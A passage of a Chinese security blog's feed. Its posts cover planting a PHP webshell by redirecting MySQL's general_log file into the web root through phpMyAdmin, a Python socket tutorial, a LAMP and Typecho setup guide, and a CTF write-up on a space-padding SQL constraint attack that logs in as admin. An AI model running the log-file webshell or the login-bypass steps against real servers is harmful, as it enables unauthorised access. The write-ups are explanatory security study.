<p>因为我用的mysql 版本较低，所以可以写马，如果mysql版本在5.7.6以上，则会出现错误</p>
<pre><code>#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement.
</code></pre><p>原因是 mysql中有一个全局变量secure-file-priv，这个变量默认参数为NULL，只要在my.ini中添加一行secure-file-priv=’路径’即可</p>
<p>那么如果网站这样做了，将OUT INTOFILE禁用了，我们该怎样getshell呢</p>
<p>利用的就是MySQL 5.0+版本会自动创建日志文件，所以可以修改全局变量来变动文件位置，但是日志生成的目录要有可读可写的权限。</p>
<p>首先要了解两个MySQL的全局变量</p>
<p>general_log          是日志保存状态 ON/OFF 开启后将保存每一条执行的SQL语句到文件中<br>general_log_file    是日志的保存路径</p>
<p>首先查看下全局变量：</p>
<p><img src="http://123.206.81.232/img/phpmyadmin_getshell/3.png" alt="请输入图片描述"></p>
<p>目前为OFF状态，将他修改为ON</p>
<pre><code>SET GLOBAL general_log=&apos;ON&apos;
</code></pre><p>查看目录发现一个新文件被创建<br>内容如下</p>
<blockquote>
<p>MySQLa, Version: 5.5.40 (MySQL Community Server (GPL)). started with:<br>TCP Port: 3306, Named Pipe: MySQL Time                 Id Command<br>Argument 170411 16:02:58       17 Quit<br>           18 Connect    root@localhost on<br>           18 Query    SET CHARACTER SET ‘utf8’<br>           18 Query    SET collation_connection = ‘utf8_general_ci’<br>           18 Init DB    mysql<br>           18 Query    SHOW MASTER LOGS<br>           18 Query    SELECT USER()<br>           18 Quit<br>           19 Connect    root@localhost on<br>           19 Query    SET CHARACTER SET ‘utf8’<br>           19 Query    SET collation_connection = ‘utf8_general_ci’<br>           19 Query    SHOW DATABASES<br>           19 Quit     170411 16:02:59       20 Connect    root@localhost on<br>           20 Query    SET CHARACTER SET ‘utf8’<br>           20 Query    SET collation_connection = ‘utf8_general_ci’<br>           20 Quit<br>           21 Connect    root@localhost on<br>           21 Query    SET CHARACTER SET ‘utf8’<br>           21 Query    SET collation_connection = ‘utf8_general_ci’<br>           21 Quit</p>
</blockquote>
<p>然后我们执行一条语句</p>
<pre><code>SELECT MD5(&apos;admin&apos;)
</code></pre><p>再打开文件</p>
<blockquote>
<p>MySQLa, Version: 5.5.40 (MySQL Community Server (GPL)). started with:<br>TCP Port: 3306, Named Pipe: MySQL Time                 Id Command<br>Argument 170411 16:02:58       17 Quit<br>           18 Connect    root@localhost on<br>           18 Query    SET CHARACTER SET ‘utf8’<br>           18 Query    SET collation_connection = ‘utf8_general_ci’<br>           18 Init DB    mysql<br>           18 Query    SHOW MASTER LOGS<br>           18 Query    SELECT USER()<br>           18 Quit<br>           19 Connect    root@localhost on<br>           19 Query    SET CHARACTER SET ‘utf8’<br>           19 Query    SET collation_connection = ‘utf8_general_ci’<br>           19 Query    SHOW DATABASES<br>           19 Quit     170411 16:02:59       20 Connect    root@localhost on<br>           20 Query    SET CHARACTER SET ‘utf8’<br>           20 Query    SET collation_connection = ‘utf8_general_ci’<br>           20 Quit<br>           21 Connect    root@localhost on<br>           21 Query    SET CHARACTER SET ‘utf8’<br>           21 Query    SET collation_connection = ‘utf8_general_ci’<br>           21 Quit     170411 16:04:49       22 Connect    root@localhost on<br>           22 Query    SET CHARACTER SET ‘utf8’<br>           22 Query    SET collation_connection = ‘utf8_general_ci’<br>           22 Init DB    mysql<br>           22 Query    SHOW MASTER LOGS<br>           22 Quit<br>           23 Connect    root@localhost on<br>           23 Query    SET CHARACTER SET ‘utf8’<br>           23 Query    SET collation_connection = ‘utf8_general_ci’<br>           23 Quit     170411 16:05:06       24 Connect    root@localhost on<br>           24 Query    SET CHARACTER SET ‘utf8’<br>           24 Query    SET collation_connection = ‘utf8_general_ci’<br>           24 Query    SELECT MD5(‘admin’)<br>           24 Init DB    mysql<br>           24 Query    SHOW MASTER LOGS<br>           24 Quit     170411 16:05:07       25 Connect    root@localhost on<br>           25 Query    SET CHARACTER SET ‘utf8’<br>           25 Query    SET collation_connection = ‘utf8_general_ci’<br>           25 Quit</p>
</blockquote>
<p>既然可以写，那么就好办了，我们可以直接写shell</p>
<pre><code>SET GLOBAL general_log_file=&apos;C:/www/1.php&apos;
</code></pre><p><img src="http://123.206.81.232/img/phpmyadmin_getshell/4.png" alt="请输入图片描述"></p>
<p>1.php被创建，然后我们就可以往里写shell了</p>
<pre><code>SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos;
</code></pre><p><img src="http://123.206.81.232/img/phpmyadmin_getshell/5.png" alt="请输入图片描述"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;Win XP&lt;br&gt;Apache 2.0&lt;br&gt;PHP 5.3.29&lt;br&gt;MySQL 5.0.8-dev&lt;/p&gt;
&lt;p&gt;条件：&lt;br&gt;  
    
    </summary>
    
    
      <category term="Web安全" scheme="1ablades.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python socket 网络编程</title>
    <link href="1ablades.github.io/2017/03/29/Python-socket-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>1ablades.github.io/2017/03/29/Python-socket-网络编程/</id>
    <published>2017-03-29T07:39:25.000Z</published>
    <updated>2017-08-09T01:00:19.994Z</updated>
    
    <content type="html"><![CDATA[<p>socket可以实现网络上，两个程序的通信实现数据交换。</p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>实现以下工作：</p>
<ul>
<li>创建socket</li>
<li>建立连接</li>
<li>收发数据</li>
</ul>
<pre><code># -*- coding:utf-8 -*-

import socket
import sys  #for exit

try:
    #create an AF_INET, STREAM socket (TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #socket()两个参数 Address Family: 可以选择AF_INET(用于Internet进程间通信)，AF_UNIX(用于同一台机器进程间通信)
    #Type :可以选择SOCKET_STREAM(流式套接字，主要用于TCP),SOCKET_DGRAM(数据报套接字，用于UDP)
except socket.error, msg:   #错误处理
    print &apos;Failed to create socket. Error code: &apos; + str(msg[0]) + &apos;, Error message :&apos; + msg[1]
    sys.exit()

print &apos;Socket Created&apos;

host = &apos;www.baidu.com&apos;
port = 80
try:
    remote_ip = socket.gethostbyname(host)      #获取ip
except socket.gaierror:
    #could not resolve
    print &apos;Hostname could not be resolved. Exiting&apos;
    sys.exit()

print &apos;Ip address of&apos; + host + &apos; is &apos; + remote_ip

#Connect to remote server
s.connect((remote_ip, port))            #进行连接

print &apos;Socket connected to &apos; + host + &apos; on ip &apos; + remote_ip

#Send some data to remote server
message= &quot;GET / HTTP/1.1\r\n\r\n&quot;

try:
    s.sendall(message)       #发送数据  
except socket.error:
    print &apos;Send failed&apos;
    sys.exit()

print &apos;Message send successfully&apos;

#Now receive data
reply = s.recv(4096)  #接受长度为4096字节的数据

print reply

s.close()
</code></pre><p>执行结果<br><img src="http://123.206.81.232/img/python_socket/4.png" alt="请输入图片描述"></p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>实现以下工作：</p>
<ul>
<li>创建socket</li>
<li>绑定socket到特定的地址及端口</li>
<li>监听连接</li>
<li>建立连接</li>
<li>接发数据</li>
</ul>
<p>要实现多个用户连接并且发送多条数据，需要用到线程。<br>code:</p>
<pre><code># -*- coding:utf-8 -*-

import socket
import sys
from thread import *

HOST = &apos;&apos;
PORT = 8888

s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print &apos;Socket created&apos;

try:
    s.bind((HOST, PORT)) #绑定socket 到地址和端口上
except socket.error, msg:
    print &apos;Bind failed. Error Code : &apos; + str(msg[0]) + &apos; Message &apos; + msg[1]
    sys.exit()

print &apos;Socket blind complete&apos;

s.listen(10)       #进行监听
print &apos;Socket now listening&apos;

#Function for handling connections. This will be used to create threads
def clientthread(conn):
    #Sending message to connected client
    conn.send(&apos;Welcome to the server. Type somthing and hit enter\n&apos;) #send only takes string

    #infinite loop so that function do not terminate and thread do not end
    while True:
        #Receiving from client
        data = conn.recv(1024)
        if not data:
            break

        print addr[0] + &apos;:&apos; + str(addr[1]) + &apos; say:&apos; + data
        conn.sendall(data)

#now keep talking whith the client
while 1:
    #wait to accept a connection - blocking call
    conn, addr = s.accept()

    #display client informaiton
    print &apos;Connected with &apos; + addr[0] + &apos;:&apos; + str(addr[1])

    #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function
    start_new_thread(clientthread, (conn,))

s.close()
</code></pre><p>执行结果<br><img src="http://123.206.81.232/img/python_socket/1.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/python_socket/2.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/python_socket/3.png" alt="请输入图片描述"><br>可以由多个终端连接，并且可以发送多条信息。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;socket可以实现网络上，两个程序的通信实现数据交换。&lt;/p&gt;
&lt;h2 id=&quot;客户端&quot;&gt;&lt;a href=&quot;#客户端&quot; class=&quot;headerlink&quot; title=&quot;客户端&quot;&gt;&lt;/a&gt;客户端&lt;/h2&gt;&lt;p&gt;实现以下工作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建socket&lt;
    
    </summary>
    
    
      <category term="Python" scheme="1ablades.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux下blog(TypEcho)搭建</title>
    <link href="1ablades.github.io/2017/03/14/Linux%E4%B8%8Bblog-TypEcho-%E6%90%AD%E5%BB%BA/"/>
    <id>1ablades.github.io/2017/03/14/Linux下blog-TypEcho-搭建/</id>
    <published>2017-03-14T08:48:57.000Z</published>
    <updated>2017-08-09T01:00:36.301Z</updated>
    
    <content type="html"><![CDATA[<p>刚搭了博客，分享下过程。</p>
<h2 id="一、服务器"><a href="#一、服务器" class="headerlink" title="一、服务器"></a>一、服务器</h2><p>首先你需要一台服务器，我的是腾讯云1元的，配置1G 1M，需要认证学生信息，一天200台，还是挺好抢的，抢到后还会送你25元域名代金券。 <a href="https://www.qcloud.com/act/campus" target="_blank" rel="external">https://www.qcloud.com/act/campus</a><br>系统的话我装的是Centos 7，在这与低版本最大的不同就是Centos 7中不再使用service而是用systemctl代替，下面也会提到。</p>
<h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>需要LAMP，也就是Linux+Apache+MySQL+PHP。</p>
<p><strong>1、安装Apache</strong></p>
<pre><code>$ yum install httpd
</code></pre><p>将其启动并设为开机自启：</p>
<pre><code>$ systemctl start httpd.service
$ systemctl enable httpd.service
</code></pre><p>记得要开通防火墙的80端口</p>
<pre><code>$ systemctl start firewalld.service
$ firewall-cmd --zone=public --add-port=80/tcp --permanent
</code></pre><p>重启防火墙生效</p>
<pre><code>$ firewall-cmd --reload
</code></pre><p>Apache的配置文件:<br>/etc/httpd/conf/httpd.conf</p>
<p><strong>2、安装PHP</strong></p>
<p>$ yum intall php<br>版本为5.4<br>安装完成后会生成配置文件 /etc/httpd/conf.d/php.conf<br>php软件本身配置文件 /etc/php.ini</p>
<p><strong>3、安装MySQL</strong></p>
<p>centos已经不支持Mysql了，有的内部集成了mariadb，会和mysql冲突，要卸载掉。<br>安装mysql依赖</p>
<pre><code>$ install vim libaio net-tools
</code></pre><p>下载mysql的repo源</p>
<pre><code>$ wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm
</code></pre><p>安装mysql-community-release-el7-5.noarch.rpm包</p>
<pre><code>$ rpm -ivh mysql-community-release-el7-5.noarch.rpm
</code></pre><p>安装mysql</p>
<pre><code>$ yum install mysql-server
$ mysql -u root
</code></pre><p>登陆可能会报错：</p>
<pre><code>ERROR 2002 (HY000): Can‘t connect to local MySQL server through socket ‘/var/lib/mysql/mysql.sock‘ (2)
</code></pre><p>原因是 /var/lib/mysql 权限问题，将 /var/lib/mysql拥有者改为当前用户就好了</p>
<pre><code>$ chown -R openscanner /var/lib/mysql
</code></pre><p>然后重启服务</p>
<pre><code>$ systemctl restart mysqld 
</code></pre><p>安装完成后需要重置密码</p>
<pre><code>$ mysql -u root
mysql &gt; use mysql;
mysql &gt; update user set password(&apos;123456&apos;) where user=&apos;root&apos;
mysql &gt; exit;
</code></pre><p>这里我遇到一个问题，登陆MySQL的时候会出现以下错误：</p>
<pre><code>ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)
</code></pre><p>解决办法若干，可以卸载MySQL重新安装，我用了以下办法。</p>
<p>停用mysql服务</p>
<pre><code>$ systemctl stop mysqld
</code></pre><p>进入mysql安全模式</p>
<pre><code>$ mysqld_safe --user=mysql --skip-grant-tables --skip-netwoking &amp;
</code></pre><p>登陆MySQL，选择mysql数据库，修改root密码</p>
<pre><code>$ mysql -u root mysql
mysql&gt; UPDATE user SET Password=PASSWORD(&apos;newpassword&apos;) where USER=&apos;root&apos;;
mysql&gt; FLUSH PRIVILEGES;
mysql&gt; quit
</code></pre><p>重启MySQL就可以登陆了</p>
<p><strong>4、安装php-mysql</strong></p>
<p>php-mysql是一个用于让PHP程序使用MySQL数据库的模块。<br>因为我安装的是PHP5，所以用php-mysqlnd代替php-mysql。</p>
<pre><code>$ yum install php-mysqlnd
</code></pre><p>重启httpd服务</p>
<pre><code>$ systemctl restart httpd
</code></pre><p><strong>5、安装PHP缓存器XCache</strong></p>
<p>LAMP已经架设好了，XCache会提高速度，降低服务器负载,用来优化PHP。<br>需要安装编译器以及php-devel(让php支持扩展)</p>
<pre><code>$ yum install gcc
$ yum install php-devel
</code></pre><p>安装XCache</p>
<pre><code>$ wget http://xcache.lighttpd.NET/pub/Releases/3.0/xcache-3.2.
</code></pre><p>到此环境配置以及完成了，此时访问网页地址 就能看到Apache的页面。</p>
<h2 id="三、安装TypEcho"><a href="#三、安装TypEcho" class="headerlink" title="三、安装TypEcho"></a>三、安装TypEcho</h2><p><strong>1、去官网下载</strong><a href="http://typecho.org/" target="_blank" rel="external">typecho</a></p>
<p><strong>2、上传压缩包到Linux服务器</strong><br>这里我用的Xshel5，一个很好用的工具，可以远程链接，然后需要在Linux安装</p>
<pre><code>$ yum install lrzsz
</code></pre><p>在Linux执行rz，就可以上传文件到Linux的当前目录，在Xshell5 执行sz就可以将Linux的文件下载到本地。</p>
<p><strong>3、解压并安装</strong></p>
<pre><code>$ tar -xzvf typecho.tar.gz
</code></pre><p>在浏览器输入<a href="http://xxx/build/install.php" target="_blank" rel="external">http://xxx/build/install.php</a> 即可进行安装。</p>
<p>安装时注意</p>
<ol>
<li><p>修改build的权限，不然无法创建config配置文件。</p>
<p>$ chmod 777 build</p>
</li>
<li><p>提前创建数据库。</p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚搭了博客，分享下过程。&lt;/p&gt;
&lt;h2 id=&quot;一、服务器&quot;&gt;&lt;a href=&quot;#一、服务器&quot; class=&quot;headerlink&quot; title=&quot;一、服务器&quot;&gt;&lt;/a&gt;一、服务器&lt;/h2&gt;&lt;p&gt;首先你需要一台服务器，我的是腾讯云1元的，配置1G 1M，需要认证学生信息，
    
    </summary>
    
    
      <category term="Linux" scheme="1ablades.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SQL字符限制导致任意用户登陆</title>
    <link href="1ablades.github.io/2017/03/14/SQL%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/"/>
    <id>1ablades.github.io/2017/03/14/SQL字符限制导致任意用户登陆/</id>
    <published>2017-03-14T07:36:10.000Z</published>
    <updated>2017-08-09T01:01:53.066Z</updated>
    
    <content type="html"><![CDATA[<p>上个星期末打NJCTF，一共没做两个题，蓝瘦。<br>其中有一个Web，是一个后台登陆页面，可以注册新用户，试着注册登陆后，提示不是admin。<br>所以要以admin身份登陆，于是想到爆破，但感觉这个题并不是。纠结了好一会，表哥告诉是<br>基于约束的SQL攻击这个东西。</p>
<p>一般用户注册后端代码如下：</p>
<pre><code>&lt;?php
// Checking whether a user with the same username exists
$username = mysql_real_escape_string($_GET[&apos;username&apos;]);
$password = mysql_real_escape_string($_GET[&apos;password&apos;]);
$query = &quot;SELECT *
  FROM users
  WHERE username=&apos;$username&apos;&quot;;
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) &gt; 0) {
// User exists, exit gracefully
.
.
  }
  else {
// If not, only then insert a new entry
$query = &quot;INSERT INTO users(username, password)
  VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;;
.
.
  }
}
</code></pre><p>验证用户登陆代码如下：</p>
<pre><code>&lt;?php
$username = mysql_real_escape_string($_GET[&apos;username&apos;]);
$password = mysql_real_escape_string($_GET[&apos;password&apos;]);
$query = &quot;SELECT username FROM users
          WHERE username=&apos;$username&apos;
              AND password=&apos;$password&apos; &quot;;
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) &gt; 0){
      $row = mysql_fetch_assoc($res);
      return $row[&apos;username&apos;];
  }
}
return Null;
</code></pre><p>也利用mysql_real_escape_string()函数过滤了用户输入，但是我们攻击的点不在这里，而是在服务器的SQL上。</p>
<p>首先，SQL进行字符串处理时，大部分会将字符串后无用的空格删去(WHERE的字符串或者INSERT的字符串等)，也就是说”string[空格]”与”string”是等同的。<br>当然也有例外，比如LIKE语句，因为LIKE函数比较时，要俩字符串长度相等，所以会将短的字符串后面填充空格。</p>
<p>所以假设username的varchar(10)，我们注册username=’admin[十个空格]1’</p>
<pre><code>SELECT * FROM users WHERE username=&apos;$username&apos;;
</code></pre><p>执行这条语句时，SQL查询的是’admin[十个空格]1’这个字符串，并不会找到匹配的结果。</p>
<pre><code>INSERT INTO users(username， password) VALUES(&apos;admin          1&apos;,&apos;anypassword&apos;);
</code></pre><p>这里INSERT查询时，SQL会根据创建表时的varchar(n)来限制字符串的最大长度,所以我们插入的username就会变成admin加5个空格。<br>这样数据库中就会有两个admin用户了，当我们进行登陆admin时，SQL进行SELECT就会返回原始admin的记录，这样我们就可以以admin的身份登陆了。<br>此攻击已在MySQL和SQLite上成功测试。</p>
<p>如果要防护，可以使用UNIQUE约束，UNIQUE约束确保在非主键列中不输入重复的值。一般使用id作为数据库表的主键，在后端验证时可以验证id。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上个星期末打NJCTF，一共没做两个题，蓝瘦。&lt;br&gt;其中有一个Web，是一个后台登陆页面，可以注册新用户，试着注册登陆后，提示不是admin。&lt;br&gt;所以要以admin身份登陆，于是想到爆破，但感觉这个题并不是。纠结了好一会，表哥告诉是&lt;br&gt;基于约束的SQL攻击这个东西
    
    </summary>
    
    
      <category term="CTF" scheme="1ablades.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
